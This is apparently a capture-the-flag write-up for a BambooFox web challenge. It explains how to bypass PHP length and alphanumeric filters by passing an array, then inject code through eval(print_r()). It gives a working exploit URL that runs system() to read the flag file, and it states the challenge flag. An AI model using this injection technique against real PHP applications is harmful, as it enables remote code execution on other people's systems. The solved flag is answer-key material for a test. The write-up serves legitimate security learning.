## ヽ(#`Д´)ﾉ
> **Category:** Web
> **Description:** 
> **Pad Link:** http://34.87.94.220/pad/web-d
> **Flag:** flag{!pee_echi_pee!}
---

## References


## Bugs

Given source:
```php
<?=
    highlight_file(__FILE__) // Open current file
    && strlen($🐱=$_GET['ヽ(#`Д´)ﾉ']) < 0x0A // Length of input must be < 10
    && !preg_match('/[a-z0-9`]/i',$🐱) // Input must not contain alphanumeric values (case-insensitive)
    && eval(print_r($🐱,1)); // Goal (probably finding "flag")
```

## Exploit Ideas

Able to bypass the `strlen()` and `preg_match()` checks by using an **array**:
```
http://chall.ctf.bamboofox.tw:9487/?ヽ(%23`Д´)ﾉ[]=<INPUT>
```

However, syntax keeps messing up due to the nature of how `eval()` is called:
```php
eval(print_r($🐱,1));
```

The idea is that print_r formats arrays like this:
~~~php
Array(
    [key1] => unescaped_and_unquoted_value1,
    [key2] => unescaped_and_unquoted_value2,
)
~~~

We need to close the array in print_r output to sth like this to eval:
~~~
Array(
    [junk] => 0
);
system("cat flag here"); /*
)
~~~

```
http://chall.ctf.bamboofox.tw:9487/?ヽ(%23%60Д´)ﾉ[A]=0);system("cat%20/flag_de42537a7dd854f4ce27234a103d4362");%20/*
```
flag{!pee_echi_pee!}

## Scripts

